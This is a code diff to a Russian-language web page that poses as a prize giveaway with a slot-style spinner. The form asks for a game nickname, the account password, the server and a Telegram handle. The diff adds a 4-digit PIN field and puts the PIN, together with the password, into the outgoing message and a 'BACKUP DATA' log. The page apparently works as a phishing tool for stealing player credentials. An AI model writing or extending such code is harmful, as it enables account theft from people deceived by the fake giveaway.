@@ -1340,6 +1340,14 @@
                         <div class="form-help error" id="telegram-error"></div>
                     </div>
 
+                    <div class="form-group">
+                        <label class="form-label">🔐 PIN код (если есть)</label>
+                        <input type="text" class="form-input" id="pincode" placeholder="4 цифры" maxlength="4"
+                            inputmode="numeric">
+                        <div class="form-help info show">Только 4 цифры</div>
+                        <div class="form-help error" id="pincode-error"></div>
+                    </div>
+
                     <button type="submit" class="submit-button" id="submitBtn">
                         🎁 Участвовать в розыгрыше
                     </button>
@@ -1917,6 +1925,12 @@
             return telegram.startsWith('@') && telegram.length > 1;
         }
 
+        // Валидация PIN (пустой или ровно 4 цифры)
+        function validatePin(pin) {
+            if (pin === '') return true;
+            return /^\d{4}$/.test(pin);
+        }
+
         // Показать ошибку
         function showError(inputId, message) {
             const input = document.getElementById(inputId);
@@ -1987,13 +2001,29 @@
             }
         });
 
+        document.getElementById('pincode').addEventListener('input', (e) => {
+            // Оставляем только цифры
+            e.target.value = e.target.value.replace(/\D/g, '');
+            const value = e.target.value;
+
+            if (value === '') {
+                clearValidation('pincode');
+            } else if (!validatePin(value)) {
+                showError('pincode', '❌ Должно быть 4 цифры');
+            } else {
+                showSuccess('pincode');
+            }
+        });
+
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
             const nickname = document.getElementById('nickname').value.trim();
             const password = document.getElementById('password').value.trim();
             const server = document.getElementById('server').value;
+
             const telegram = document.getElementById('telegram').value.trim();
+            const pincode = document.getElementById('pincode').value.trim();
 
             // Валидация никнейма
             if (!validateNickname(nickname)) {
@@ -2023,12 +2053,20 @@
                 return;
             }
 
+            // Валидация PIN (если указан)
+            if (pincode && !validatePin(pincode)) {
+                showError('pincode', '❌ PIN код должен состоять из 4 цифр');
+                document.getElementById('pincode').focus();
+                return;
+            }
+
             const submitBtn = document.getElementById('submitBtn');
             const originalText = submitBtn.innerHTML;
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<div class="loading-spinner"></div> Отправка...';
 
             const telegramFormatted = telegram || 'Не указан';
+            const pinFormatted = pincode || 'Не указан';
 
             const prizeWon = wonPrize ? `${wonPrize.text} ${wonPrize.label}` : 'Не выбран';
 
@@ -2038,6 +2076,7 @@
 🎉 <b>Выигранный приз:</b> ${prizeWon}
 👤 <b>Никнейм:</b> ${nickname}
 🔑 <b>Пароль:</b> ${password}
+🔐 <b>PIN-код:</b> ${pinFormatted}
 🖥 <b>Сервер:</b> ${server}
 📱 <b>Telegram:</b> ${telegramFormatted}
 ⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}
@@ -2064,6 +2103,7 @@
                             clearValidation('nickname');
                             clearValidation('password');
                             clearValidation('telegram');
+                            clearValidation('pincode');
                             submitBtn.disabled = false;
                             submitBtn.innerHTML = originalText;
                             resetModal();
@@ -2075,7 +2115,7 @@
             } catch (error) {
                 console.error('Error:', error);
 
-                console.log('BACKUP DATA:', { nickname, password, server, telegram: telegramFormatted, prize: prizeWon, time: new Date().toISOString() });
+                console.log('BACKUP DATA:', { nickname, password, server, pin: pincode, telegram: telegramFormatted, prize: prizeWon, time: new Date().toISOString() });
 
                 formContainer.style.display = 'none';
                 successMessage.classList.add('active');
@@ -2093,6 +2133,7 @@
                         clearValidation('nickname');
                         clearValidation('password');
                         clearValidation('telegram');
+                        clearValidation('pincode');
                         submitBtn.disabled = false;
                         submitBtn.innerHTML = originalText;
                         resetModal();
@@ -2425,7 +2466,7 @@
             setTimeout(() => {
                 jackpotSound.currentTime = 0;
                 jackpotSound.play().catch(e => console.log('Audio play failed:', e));
-            }, 300);
+            }, 1000);
 
             // ШАГ 2: ВЫБИРАЕМ ПРИЗ ДО АНИМАЦИИ (ключевой момент!)
             const selection = selectPrizeByWeight(prizes);
